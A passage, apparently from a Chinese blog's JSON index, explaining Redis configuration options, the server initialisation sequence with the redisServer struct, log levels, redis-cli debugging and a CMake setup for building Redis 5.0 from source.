如果是的话，redis会采用LZF算法进行压缩。如果你不想消耗CPU来进行压缩的话，可以设置为关闭此功能，但是存储在磁盘上的快照会比较大。 ④、rdbchecksum ：默认值是yes。在存储快照后，我们还可以让redis使用CRC64算法来进行数据校验， 但是这样做会增加大约10%的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能。 ⑤、dbfilename ：设置快照的文件名，默认是 dump.rdb ⑥、dir：设置快照文件的存放路径，这个配置项一定是个目录，而不能是文件名。使用上面的 dbfilename 作为保存的文件名。 2.7、REPLICATION①、slave-serve-stale-data：默认值为yes。当一个 slave 与 master 失去联系，或者复制正在进行的时候，slave 可能会有两种表现： 1) 如果为 yes ，slave 仍然会应答客户端请求，但返回的数据可能是过时，或者数据可能是空的在第一次同步的时候 2) 如果为 no ，在你执行除了 info he salveof 之外的其他命令时，slave 都将返回一个 &quot;SYNC with master in progress&quot; 的错误 ②、slave-read-only：配置Redis的Slave实例是否接受写操作，即Slave是否为只读Redis。默认值为yes。 ③、repl-diskless-sync：主从数据复制是否使用无硬盘复制功能。默认值为no。 ④、repl-diskless-sync-delay：当启用无硬盘备份，服务器等待一段时间后才会通过套接字向从站传送RDB文件，这个等待时间是可配置的。 这一点很重要，因为一旦传送开始，就不可能再为一个新到达的从站服务。从站则要排队等待下一次RDB传送。因此服务器等待一段 时间以期更多的从站到达。 延迟时间以秒为单位，默认为5秒。要关掉这一功能，只需将它设置为0秒，传送会立即启动。默认值为5。 ⑤、repl-disable-tcp-nodelay：同步之后是否禁用从站上的TCP_NODELAY 如果你选择yes，redis会使用较少量的TCP包和带宽向从站发送数据。 但这会导致在从站增加一点数据的延时。 Linux内核默认配置情况下最多40毫秒的延时。如果选择no，从站的数据延时不会那么多，但备份需要的带宽相对较多。 默认情况下我们将潜在因素优化，但在高负载情况下或者在主从站都跳的情况下，把它切换为yes是个好主意。默认值为no。 2.8、SECURITY①、rename-command：命令重命名，对于一些危险命令例如： flushdb（清空数据库） flushall（清空所有记录） config（客户端连接后可配置服务器） keys（客户端连接后可查看所有存在的键） 作为服务端redis-server，常常需要禁用以上命令来使得服务器更加安全，禁用的具体做法是是： rename-command FLUSHALL &quot;&quot; 也可以保留命令但是不能轻易使用，重命名这个命令即可： rename-command FLUSHALL abcdefg 这样，重启服务器后则需要使用新命令来执行操作，否则服务器会报错unknown command。 ②、requirepass:设置redis连接密码 比如: requirepass 123 表示redis的连接密码为123. 2.9、CLIENTS①、maxclients ：设置客户端最大并发连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件。描述符数-32（redis server自身会使用一些），如果设置 maxclients为0 。表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息 2.10、MEMORY MANAGEMENT①、maxmemory：设置Redis的最大内存，如果设置为0 。表示不作限制。通常是配合下面介绍的maxmemory-policy参数一起使用。 ②、maxmemory-policy ：当内存使用达到maxmemory设置的最大值时，redis使用的内存清除策略。有以下几种可以选择： 1）volatile-lru 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used ) 2）allkeys-lru 利用LRU算法移除任何key 3）volatile-random 移除设置过过期时间的随机key 4）allkeys-random 移除随机ke 5）volatile-ttl 移除即将过期的key(minor TTL) 6）noeviction noeviction 不移除任何key，只是返回一个写错误 ，默认选项 ③、maxmemory-samples ：LRU 和 minimal TTL 算法都不是精准的算法，但是相对精确的算法(为了节省内存)。 随意你可以选择样本大小进行检，redis默认选择3个样本进行检测，你可以通过maxmemory-samples进行设置样本数。 2.11、APPEND ONLY MODE①、appendonly：默认redis使用的是rdb方式持久化，这种方式在许多应用中已经足够用了。 但是redis如果中途宕机，会导致可能有几分钟的数据丢失，根据save来策略进行持久化，Append Only File是另一种持久化方式，可以提供更好的持久化特性。Redis会把每次写入的数据在接收后都写入appendonly.aof文件，每次启动时Redis都会先把这个文件的数据读入内存里，先忽略RDB文件。默认值为no。 ②、appendfilename ：aof文件名，默认是”appendonly.aof” ③、appendfsync：aof持久化策略的配置；no表示不执行fsync，由操作系统保证数据同步到磁盘，速度最快； always表示每次写入都执行fsync，以保证数据同步到磁盘；everysec表示每秒执行一次fsync，可能会导致丢失这1s数据 ④、no-appendfsync-on-rewrite：在aof重写或者写入rdb文件的时候，会执行大量IO，此时对于everysec和always的aof模式来说， 执行fsync会造成阻塞过长时间，no-appendfsync-on-rewrite字段设置为默认设置为no。 如果对延迟要求很高的应用，这个字段可以设置为yes，否则还是设置为no，这样对持久化特性来说这是更安全的选择。 设置为yes表示rewrite期间对新写操作不fsync,暂时存在内存中,等rewrite完成后再写入，默认为no，建议yes。 Linux的默认fsync策略是30秒。可能丢失30秒数据。默认值为no。 ⑤、auto-aof-rewrite-percentage：默认值为100。aof自动重写配置，当目前aof文件大小超过上一次重写的aof文件大小的百分之多少进行重写， 即当aof文件增长到一定大小的时候，Redis能够调用bgrewriteaof对日志文件进行重写。 当前AOF文件大小是上次日志重写得到AOF文件大小的二倍（设置为100）时，自动启动新的日志重写过程。 ⑥、auto-aof-rewrite-min-size：64mb。设置允许重写的最小aof文件大小，避免了达到约定百分比但尺寸仍然很小的情况还要重写。 ⑦、aof-load-truncated：aof文件可能在尾部是不完整的，当redis启动的时候，aof文件的数据被载入内存。 重启可能发生在redis所在的主机操作系统宕机后，尤其在ext4文件系统没有加上data=ordered选项，出现这种现象 redis宕机或者异常终止不会造成尾部不完整现象，可以选择让redis退出，或者导入尽可能多的数据。 如果选择的是yes，当截断的aof文件被导入的时候，会自动发布一个log给客户端然后load。 如果是no，用户必须手动redis-check-aof修复AOF文件才可以。默认值为 yes。 12、LUA SCRIPTING①、lua-time-limit：一个lua脚本执行的最大时间，单位为ms。默认值为5000. 13、REDIS CLUSTER①、cluster-enabled：集群开关，默认是不开启集群模式。 ②、cluster-config-file：集群配置文件的名称，每个节点都有一个集群相关的配置文件，持久化保存集群的信息。 这个文件并不需要手动配置，这个配置文件有Redis生成并更新，每个Redis集群节点需要一个单独的配置文件。 请确保与实例运行的系统中配置文件名称不冲突。默认配置为nodes-6379.conf。 ③、cluster-node-timeout ：可以配置值为15000。节点互连超时的阀值，集群节点超时毫秒数 ④、cluster-slave-validity-factor ：可以配置值为10。在进行故障转移的时候，全部slave都会请求申请为master， 但是有些slave可能与master断开连接一段时间了， 导致数据过于陈旧，这样的slave不应该被提升为master。 该参数就是用来判断slave节点与master断线的时间是否过长。 判断方法是：比较slave断开连接的时间和(node-timeout * slave-validity-factor) + repl-ping-slave-period 如果节点超时时间为三十秒, 并且slave-validity-factor为10,假设默认的repl-ping-slave-period是10秒， 即如果超过310秒slave将不会尝试进行故障转移 ⑤、cluster-migration-barrier ：可以配置值为1。master的slave数量大于该值，slave才能迁移到其他孤立master上， 如这个参数若被设为2，那么只有当一个主节点拥有2 个可工作的从节点时，它的一个从节点会尝试迁移。 ⑥、cluster-require-full-coverage：默认情况下，集群全部的slot有节点负责，集群状态才为ok，才能提供服务。 设置为no，可以在slot没有全部分配的时候提供服务。不建议打开该配置，这样会造成分区的时候，小分区的master一直在接受写请求， 而造成很长时间数据不一致。","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.1.reedis-服务启动","slug":"data/redis/code/2.1.服务启动","date":"2022-04-07T01:21:38.758Z","updated":"2022-04-07T01:21:38.759Z","comments":true,"path":"2022/04/07/data/redis/code/2.1.服务启动/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.1.%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/","excerpt":"","text":"初始化服务器从启动 Redis 服务器， 到服务器可以接受外来客户端的网络连接这段时间， Redis 需要执行一系列初始化操作。 整个初始化过程可以分为以下步骤： 12345678910111213初始化服务器全局状态初始化redismodulesentinel模块载入【配置为sentinel时】载入配置文件创建 daemon 进程。初始化服务器功能模块。集群初始化 //clusterInit();初始化复制 //replicationScriptCacheInit();脚本初始化 //scriptingInit(1);慢查询日志初始化 //slowlogInit();初始化监控 //latencyMonitorInit();载入数据。开始事件循环。 以下各个小节将介绍 Redis 服务器初始化的各个步骤。 1.初始化服务器全局状态redis.h/redisServer 结构记录了和服务器相关的所有数据， 这个结构主要包含以下信息： 12345678910111213141516服务器中的所有数据库。命令表：在执行命令时，根据字符来查找相应命令的实现函数。事件状态。服务器的网络连接信息：套接字地址、端口，以及套接字描述符。所有已连接客户端的信息。日志（log）和慢查询日志（slowlog）的选项和相关信息。服务器配置选项：比如要创建多少个数据库，是否将服务器进程作为 daemon 进程来运行， 最大连接多少个客户端，压缩结构（zip structure）的实体数量，等等。统计信息：比如键有多少次命令、不命中，服务器的运行时间，内存占用，等等。数据持久化（AOF 和 RDB）的配置和状态。－ slave信息－ master信息实现订阅与发布（pub/sub）功能所需的数据结构。－ 是否运行集群及相关选项。Lua 脚本的运行环境及相关选项。－ 调试信息选项 详情请参考 server.h 文件,部分内容如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274/*server对象*/struct redisServer &#123;/* General */ //配置文件路径 char *configfile; /* Absolute config file path, or NULL */ //serverCron()调用频率 int hz; /* serverCron() calls frequency in hertz */ //数据库对象 redisDb *db; //支持的命令列表 dict *commands; /* Command table */ //没有转化的命令 dict *orig_commands; /* Command table before command renaming. */ //事件 aeEventLoop *el; //每分钟增加一次 unsigned lruclock:22; /* Clock incrementing every minute, for LRU */ unsigned lruclock_padding:10; int shutdown_asap; /* SHUTDOWN needed ASAP */ int activerehashing; /* Incremental rehash in serverCron() */ //验证密码 char *requirepass; /* Pass for AUTH command, or NULL */ char *pidfile; /* PID file path */ int arch_bits; /* 32 or 64 depending on sizeof(long) */ int cronloops; /* Number of times the cron function run */ char runid[REDIS_RUN_ID_SIZE+1]; /* ID always different at every exec. */ int sentinel_mode; /* True if this instance is a Sentinel. */ /* Networking */ int port; /* TCP listening port */ int tcp_backlog; /* TCP listen() backlog */ char *bindaddr[REDIS_BINDADDR_MAX]; /* Addresses we should bind to */ int bindaddr_count; /* Number of addresses in server.bindaddr[] */ char *unixsocket; /* UNIX socket path */ mode_t unixsocketperm; /* UNIX socket permission */ int ipfd[REDIS_BINDADDR_MAX]; /* TCP socket file descriptors */ int ipfd_count; /* Used slots in ipfd[] */ int sofd; /* Unix socket file descriptor */ int cfd[REDIS_BINDADDR_MAX];/* Cluster bus listening socket */ int cfd_count; /* Used slots in cfd[] */ //连接客户端 list *clients; /* List of active clients */ list *clients_to_close; /* Clients to close asynchronously */ list *slaves, *monitors; /* List of slaves and MONITORs */ redisClient *current_client; /* Current client, only used on crash report */ int clients_paused; /* True if clients are currently paused */ mstime_t clients_pause_end_time; /* Time when we undo clients_paused */ char neterr[ANET_ERR_LEN]; /* Error buffer for anet.c */ dict *migrate_cached_sockets;/* MIGRATE cached sockets */ /* RDB / AOF loading information */ int loading; /* We are loading data from disk if true */ off_t loading_total_bytes; off_t loading_loaded_bytes; time_t loading_start_time; off_t loading_process_events_interval_bytes; /* Fast pointers to often looked up command */ struct redisCommand *delCommand, *multiCommand, *lpushCommand, *lpopCommand, *rpopCommand; /* Fields used only for stats */ time_t stat_starttime; /* Server start time */ long long stat_numcommands; /* Number of processed commands */ long long stat_numconnections; /* Number of connections received */ long long stat_expiredkeys; /* Number of expired keys */ long long stat_evictedkeys; /* Number of evicted keys (maxmemory) */ long long stat_keyspace_hits; /* Number of successful lookups of keys */ long long stat_keyspace_misses; /* Number of failed lookups of keys */ size_t stat_peak_memory; /* Max used memory record */ long long stat_fork_time; /* Time needed to perform latest fork() */ long long stat_rejected_conn; /* Clients rejected because of maxclients */ long long stat_sync_full; /* Number of full resyncs with slaves. */ long long stat_sync_partial_ok; /* Number of accepted PSYNC requests. */ long long stat_sync_partial_err;/* Number of unaccepted PSYNC requests. */ //保存慢日志命令 list *slowlog; /* SLOWLOG list of commands */ long long slowlog_entry_id; /* SLOWLOG current entry ID */ long long slowlog_log_slower_than; /* SLOWLOG time limit (to get logged) */ unsigned long slowlog_max_len; /* SLOWLOG max number of items logged */ /* The following two are used to track instantaneous &quot;load&quot; in terms * of operations per second. */ long long ops_sec_last_sample_time; /* Timestamp of last sample (in ms) */ long long ops_sec_last_sample_ops; /* numcommands in last sample */ long long ops_sec_samples[REDIS_OPS_SEC_SAMPLES]; int ops_sec_idx; /* Configuration */ int verbosity; /* Loglevel in redis.conf */ int maxidletime; /* Client timeout in seconds */ int tcpkeepalive; /* Set SO_KEEPALIVE if non-zero. */ int active_expire_enabled; /* Can be disabled for testing purposes. */ size_t client_max_querybuf_len; /* Limit for client query buffer length */ int dbnum; /* Total number of configured DBs */ int daemonize; /* True if running as a daemon */ clientBufferLimitsConfig client_obuf_limits[REDIS_CLIENT_LIMIT_NUM_CLASSES]; /* AOF persistence */ int aof_state; /* REDIS_AOF_(ON|OFF|WAIT_REWRITE) */ int aof_fsync; /* Kind of fsync() policy */ char *aof_filename; /* Name of the AOF file */ int aof_no_fsync_on_rewrite; /* Don&#x27;t fsync if a rewrite is in prog. */ int aof_rewrite_perc; /* Rewrite AOF if % growth is &gt; M and... */ off_t aof_rewrite_min_size; /* the AOF file is at least N bytes. */ off_t aof_rewrite_base_size; /* AOF size on latest startup or rewrite. */ off_t aof_current_size; /* AOF current size. */ int aof_rewrite_scheduled; /* Rewrite once BGSAVE terminates. */ pid_t aof_child_pid; /* PID if rewriting process */ list *aof_rewrite_buf_blocks; /* Hold changes during an AOF rewrite. */ sds aof_buf; /* AOF buffer, written before entering the event loop */ int aof_fd; /* File descriptor of currently selected AOF file */ int aof_selected_db; /* Currently selected DB in AOF */ time_t aof_flush_postponed_start; /* UNIX time of postponed AOF flush */ time_t aof_last_fsync; /* UNIX time of last fsync() */ time_t aof_rewrite_time_last; /* Time used by last AOF rewrite run. */ time_t aof_rewrite_time_start; /* Current AOF rewrite start time. */ int aof_lastbgrewrite_status; /* REDIS_OK or REDIS_ERR */ unsigned long aof_delayed_fsync; /* delayed AOF fsync() counter */ int aof_rewrite_incremental_fsync;/* fsync incrementally while rewriting? */ int aof_last_write_status; /* REDIS_OK or REDIS_ERR */ int aof_last_write_errno; /* Valid if aof_last_write_status is ERR */ /* RDB persistence */ long long dirty; /* Changes to DB from the last save */ long long dirty_before_bgsave; /* Used to restore dirty on failed BGSAVE */ pid_t rdb_child_pid; /* PID of RDB saving child */ struct saveparam *saveparams; /* Save points array for RDB */ int saveparamslen; /* Number of saving points */ char *rdb_filename; /* Name of RDB file */ int rdb_compression; /* Use compression in RDB? */ int rdb_checksum; /* Use RDB checksum? */ time_t lastsave; /* Unix time of last successful save */ time_t lastbgsave_try; /* Unix time of last attempted bgsave */ time_t rdb_save_time_last; /* Time used by last RDB save run. */ time_t rdb_save_time_start; /* Current RDB save start time. */ int lastbgsave_status; /* REDIS_OK or REDIS_ERR */ int stop_writes_on_bgsave_err; /* Don&#x27;t allow writes if can&#x27;t BGSAVE */ /* Propagation of commands in AOF / replication */ redisOpArray also_propagate; /* Additional command to propagate. */ /* Logging */ char *logfile; /* Path of log file */ int syslog_enabled; /* Is syslog enabled? */ char *syslog_ident; /* Syslog ident */ int syslog_facility; /* Syslog facility */ /* Replication (master) */ int slaveseldb; /* Last SELECTed DB in replication output */ long long master_repl_offset; /* Global replication offset */ int repl_ping_slave_period; /* Master pings the slave every N seconds */ char *repl_backlog; /* Replication backlog for partial syncs */ long long repl_backlog_size; /* Backlog circular buffer size */ long long repl_backlog_histlen; /* Backlog actual data length */ long long repl_backlog_idx; /* Backlog circular buffer current offset */ long long repl_backlog_off; /* Replication offset of first byte in the backlog buffer. */ time_t repl_backlog_time_limit; /* Time without slaves after the backlog gets released. */ time_t repl_no_slaves_since; /* We have no slaves since that time. Only valid if server.slaves len is 0. */ int repl_min_slaves_to_write; /* Min number of slaves to write. */ int repl_min_slaves_max_lag; /* Max lag of &lt;count&gt; slaves to write. */ int repl_good_slaves_count; /* Number of slaves with lag &lt;= max_lag. */ /* Replication (slave) */ char *masterauth; /* AUTH with this password with master */ char *masterhost; /* Hostname of master */ int masterport; /* Port of master */ int repl_timeout; /* Timeout after N seconds of master idle */ redisClient *master; /* Client that is master for this slave */ redisClient *cached_master; /* Cached master to be reused for PSYNC. */ int repl_syncio_timeout; /* Timeout for synchronous I/O calls */ int repl_state; /* Replication status if the instance is a slave */ off_t repl_transfer_size; /* Size of RDB to read from master during sync. */ off_t repl_transfer_read; /* Amount of RDB read from master during sync. */ off_t repl_transfer_last_fsync_off; /* Offset when we fsync-ed last time. */ int repl_transfer_s; /* Slave -&gt; Master SYNC socket */ int repl_transfer_fd; /* Slave -&gt; Master SYNC temp file descriptor */ char *repl_transfer_tmpfile; /* Slave-&gt; master SYNC temp file name */ time_t repl_transfer_lastio; /* Unix time of the latest read, for timeout */ int repl_serve_stale_data; /* Serve stale data when link is down? */ int repl_slave_ro; /* Slave is read only? */ time_t repl_down_since; /* Unix time at which link with master went down */ int repl_disable_tcp_nodelay; /* Disable TCP_NODELAY after SYNC? */ int slave_priority; /* Reported in INFO and used by Sentinel. */ char repl_master_runid[REDIS_RUN_ID_SIZE+1]; /* Master run id for PSYNC. */ long long repl_master_initial_offset; /* Master PSYNC offset. */ /* Replication script cache. */ dict *repl_scriptcache_dict; /* SHA1 all slaves are aware of. */ list *repl_scriptcache_fifo; /* First in, first out LRU eviction. */ int repl_scriptcache_size; /* Max number of elements. */ /* Synchronous replication. */ list *clients_waiting_acks; /* Clients waiting in WAIT command. */ int get_ack_from_slaves; /* If true we send REPLCONF GETACK. */ /* Limits */ unsigned int maxclients; /* Max number of simultaneous clients */ unsigned long long maxmemory; /* Max number of memory bytes to use */ int maxmemory_policy; /* Policy for key eviction */ int maxmemory_samples; /* Pricision of random sampling */ /* Blocked clients */ unsigned int bpop_blocked_clients; /* Number of clients blocked by lists */ list *unblocked_clients; /* list of clients to unblock before next loop */ list *ready_keys; /* List of readyList structures for BLPOP &amp; co */ /* Sort parameters - qsort_r() is only available under BSD so we * have to take this state global, in order to pass it to sortCompare() */ int sort_desc; int sort_alpha; int sort_bypattern; int sort_store; /* Zip structure config, see redis.conf for more information */ size_t hash_max_ziplist_entries; size_t hash_max_ziplist_value; size_t list_max_ziplist_entries; size_t list_max_ziplist_value; size_t set_max_intset_entries; size_t zset_max_ziplist_entries; size_t zset_max_ziplist_value; time_t unixtime; /* Unix time sampled every cron cycle. */ long long mstime; /* Like &#x27;unixtime&#x27; but with milliseconds resolution. */ /* Pubsub */ dict *pubsub_channels; /* Map channels to list of subscribed clients */ list *pubsub_patterns; /* A list of pubsub_patterns */ int notify_keyspace_events; /* Events to propagate via Pub/Sub. This is an xor of REDIS_NOTIFY... flags. */ /* Cluster */ int cluster_enabled; /* Is cluster enabled? */ mstime_t cluster_node_timeout; /* Cluster node timeout. */ char *cluster_configfile; /* Cluster auto-generated config file name. */ struct clusterState *cluster; /* State of the cluster */ int cluster_migration_barrier; /* Cluster replicas migration barrier. */ /* Scripting */ lua_State *lua; /* The Lua interpreter. We use just one for all clients */ redisClient *lua_client; /* The &quot;fake client&quot; to query Redis from Lua */ redisClient *lua_caller; /* The client running EVAL right now, or NULL */ dict *lua_scripts; /* A dictionary of SHA1 -&gt; Lua scripts */ mstime_t lua_time_limit; /* Script timeout in milliseconds */ mstime_t lua_time_start; /* Start time of script, milliseconds time */ int lua_write_dirty; /* True if a write command was called during the execution of the current script. */ int lua_random_dirty; /* True if a random command was called during the execution of the current script. */ int lua_timedout; /* True if we reached the time limit for script execution. */ int lua_kill; /* Kill the script if true. */ /* Assert &amp; bug reporting */ char *assert_failed; char *assert_file; int assert_line; int bug_report_start; /* True if bug report header was already logged. */ int watchdog_period; /* Software watchdog period in ms. 0 = off */&#125;; 程序创建一个的 redisServer 结构的实例变量server，调用函数 initServerConfig(),将 server 的各个属性初始化为默认值。 当 server 变量的初始化完成之后， 程序进入服务器初始化的下一步： 读入配置文件。 2.初始化RedisModuleRedisModule为为4.0新增内容，moduleInitModulesSystem函数负责加载模块module介绍：Redis Module原理module实例：手把手教你玩儿一下 Redis Module 之模块解读 3.sentinel模块初始化其实在读入配置文件前， 还要判断是不是sentinel， 如果sentinel，还需要通过initSentinelConfig()和initSentinel()初始化， 才通过resetServerSaveParams()重置param选项， 通过loadServerConfig(configfile,options)读入配置文件和显选项。 4.读入配置文件在初始化服务器的上一步中， 程序为 server 变量（也即是服务器状态）的各个属性设置了默认值， 但这些默认值有时候并不是最合适的： 比如： 用户可能想使用 AOF 持久化，而不是默认的 RDB 持久化。 用户可能想用其他端口来运行 Redis ，以避免端口冲突。 用户可能不想使用默认的 16 个数据库，而是分配更多或更少数量的数据库。 用户可能想对默认的内存限制措施和回收策略做调整。 为了让使用者按自己的要求配置服务器， Redis 允许用户在运行服务器时， 提供相应的配置文件（config file）或者显式的选项（options），Redis 在初始化完 server 变量之后， 会读入配置文件和选项，然后根据这些配置来对 server 变量的属性值做相应的修改： 如果单纯执行 redis-server 命令，那么服务器以默认的配置来运行 Redis 。另一方面， 如果给 Redis 服务器送入一个配置文件， 那么 Redis将按配置文件的设置来更新服务器的状态。 比如说， 通过命令 redis-server /etc/my-redis.conf，Redis 会根据 my-redis.conf 文件的内容来对服务器状态做相应的修改。除此之外， 还可以显式地给服务器传入选项， 直接修改服务器配置。举个例子， 通过命令 redis-server –port 10086 ， 可以让 Redis 服务器端口变更为 10086 。当然，同时使用配置文件和显式选项也是可以的， 如果文件和选项有冲突的地方，那么优先使用选项所指定的配置值。 举个例子， 如果运行命令 redis-server /etc/my-redis.conf –port 10086 ，并且 my-redis.conf 也指定了 port 选项， 那么服务器将优先使用–port 10086 （实际上是选项指定的值覆盖了配置文件中的值。 创建 daemon 进程Redis 默认不以 daemon 进程的方式运行。 若服务器初始化进行到这一步时， 程序将创建 daemon 进程来运行 Redis ， 并创建相应的 pid 文件。 初始化服务器功能模块12345678910111213141516171819202122在这一步， 初始化程序完成两件事：为 server 变量的数据结构子属性分配内存。初始化这些数据结构。为数据结构分配内存， 并初始化这些数据结构， 等同于对相应的功能进行初始化。比如说， 当为订阅与发布所需的链表分配内存之后， 订阅与发布功能就处于就绪状态， 随时可以为 Redis 所用了。在这一步， initServer()完成的主要动作如下： 初始化 Redis 进程的信号功能。 初始化日志功能。 初始化客户端功能。 初始化共享对象。 初始化事件功能。 初始化网络连接。 初始化数据库。 初始化订阅与发布功能。 初始化各个统计变量。 关联服务器常规操作（cron job）到时间事件，关联客户端应答处理器到文件事件。 如果 AOF 功能已打开，那么打开或创建 AOF 文件。 设置内存限制。 初始化 Lua 脚本环境。 初始化慢查询功能。 初始化后台操作线程。 完成这一步之后， 服务器redisAsciiArt()打印出 Redis 的 ASCII LOGO 、服务器版本等信息， 表示所有功能模块已经就绪， 可以等待被使用了： 12345678910111213141516171819 _._ _.-``__ &#x27;&#x27;-._ _.-`` `. `_. &#x27;&#x27;-._ Redis 3.0.beta (7a47887b/1) 32 bit.-`` .-```. ```\\/ _.,_ &#x27;&#x27;-._( &#x27; , .-` | `, ) Running in stand alone mode|`-._`-...-` __...-.``-._|&#x27;` _.-&#x27;| Port: 6379| `-._ `._ / _.-&#x27; | PID: 6717`-._ `-._ `-./ _.-&#x27; _.-&#x27;|`-._`-._ `-.__.-&#x27; _.-&#x27;_.-&#x27;|| `-._`-._ _.-&#x27;_.-&#x27; | http://redis.io`-._ `-._`-.__.-&#x27;_.-&#x27; _.-&#x27;|`-._`-._ `-.__.-&#x27; _.-&#x27;_.-&#x27;|| `-._`-._ _.-&#x27;_.-&#x27; |`-._ `-._`-.__.-&#x27;_.-&#x27; _.-&#x27;`-._ `-.__.-&#x27; _.-&#x27;`-._ _.-&#x27;`-.__.-&#x27;虽然所有功能已经就绪， 但这时服务器的数据库还是一片空白， 程序还需要将服务器上一次执行时记录的数据载入到当前服务器中， 服务器的初始化才算真正完成。 载入数据在这一步， 如果不为sentinel， 程序需要将持久化在 RDB 或者 AOF 文件里的数据， 载入到服务器进程里面。 如果服务器有启用 AOF 功能的话， 那么使用 AOF 文件来还原数据； 否则， 程序使用 RDB 文件来还原数据。 当执行完这一步时， 服务器打印出一段载入完成信息： [6717] 22 Feb 11:59:14.830 * DB loaded from disk: 0.068 seconds Note 如果是集群， 还要检查数据的一致性。 开始事件循环到了这一步， 服务器的初始化已经完成， 程序打开事件循环， 开始接受客户端连接。 以下是服务器在这一步打印的信息： [6717] 22 Feb 11:59:14.830 * The server is now ready to accept connections on port 6379 参考：初始化服务器","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"1.4.redis-日志级别","slug":"data/redis/code/1.4.日志级别","date":"2022-04-07T01:21:38.757Z","updated":"2022-04-07T01:21:38.758Z","comments":true,"path":"2022/04/07/data/redis/code/1.4.日志级别/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/1.4.%E6%97%A5%E5%BF%97%E7%BA%A7%E5%88%AB/","excerpt":"","text":"Redis默认的设置为verbose，开发测试阶段可以用debug，生产模式一般选用notice 1.debug：会打印出很多信息，适用于开发和测试阶段 2.verbose（冗长的）：包含很多不太有用的信息，但比debug要清爽一些 3.notice：适用于生产模式 4.warning : 警告信息","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"1.3.redis-源码调试","slug":"data/redis/code/1.3.源码调试","date":"2022-04-07T01:21:38.757Z","updated":"2022-04-07T01:21:38.757Z","comments":true,"path":"2022/04/07/data/redis/code/1.3.源码调试/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/1.3.%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/","excerpt":"","text":"源码调试客户端连接 单机启动开启集群会报错 1CLUSTERDOWN Hash slot not served 进行单机集群修正 1redis-cli --cluster fix 127.0.0.1:7009 提示输入yes 客户端连接 1./redis-cli -h 127.0.0.1 -p 7009 set 测试 123127.0.0.1:7009&gt; set test testOK get 测试 1234567127.0.0.1:7009&gt; get test&quot;test&quot;(3.24s) //debug时间过长会返回127.0.0.1:7009&gt; get test&quot;test&quot;","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"1.2.redis-源码环境搭建","slug":"data/redis/code/1.2.源码环境搭建","date":"2022-04-07T01:21:38.756Z","updated":"2022-04-07T01:21:38.756Z","comments":true,"path":"2022/04/07/data/redis/code/1.2.源码环境搭建/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/1.2.%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"说明：基于 redis5.0拉取及修改目录 拉取代码切换分支 创建CmakeLists cmake reload 也可以拉取 https://github.com/coral-learning/redis.git 123456789101112➜ git clone https://github.com/antirez/redis redis➜ git checkout -b 5.0 origin/5.0➜ cd redis➜ find . -iname CMakelists.txt ./CMakeLists.txt ./deps/CMakeLists.txt ./deps/linenoise/CMakeLists.txt ./deps/hiredis/CMakeLists.txt ./deps/lua/CMakeLists.txt ./deps/lua/src/CMakeLists.txt ./src/modules/CMakeLists.txt redis123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119➜ vi CMakeLists.txtcmake_minimum_required(VERSION 3.0 FATAL_ERROR)project(redis VERSION 4.0)set(CMAKE_BUILD_TYPE &quot;Debug&quot;)get_filename_component(REDIS_ROOT &quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;&quot; ABSOLUTE)add_subdirectory(deps)add_subdirectory(src/modules)set(SRC_SERVER_TMP src/adlist.c src/ae.c src/anet.c src/dict.c src/sds.c src/zmalloc.c src/lzf_c.c src/lzf_d.c src/pqsort.c src/zipmap.c src/sha1.c src/ziplist.c src/release.c src/networking.c src/util.c src/object.c src/db.c src/replication.c src/rdb.c src/t_string.c src/t_list.c src/t_set.c src/t_zset.c src/evict.c src/defrag.c src/module.c src/quicklist.c src/expire.c src/childinfo.c src/redis-check-aof.c src/redis-check-rdb.c src/lazyfree.c src/geohash.c src/rax.c src/geohash_helper.c src/siphash.c src/geo.c src/t_hash.c src/config.c src/aof.c src/pubsub.c src/multi.c src/debug.c src/sort.c src/intset.c src/syncio.c src/cluster.c src/crc16.c src/endianconv.c src/slowlog.c src/scripting.c src/bio.c src/rio.c src/rand.c src/memtest.c src/crc64.c src/bitops.c src/sentinel.c src/notify.c src/setproctitle.c src/blocked.c src/hyperloglog.c src/latency.c src/sparkline.c )set(SRC_SERVER src/server.c $&#123;SRC_SERVER_TMP&#125;)set(SRC_CLI src/anet.c src/sds.c src/adlist.c src/redis-cli.c src/zmalloc.c src/release.c src/anet.c src/ae.c src/crc64.c )set(EXECUTABLE_OUTPUT_PATH src)link_directories(deps/linenoise/ deps/lua/src deps/hiredis)add_executable(redis-server $&#123;SRC_SERVER&#125;)target_include_directories(redis-server 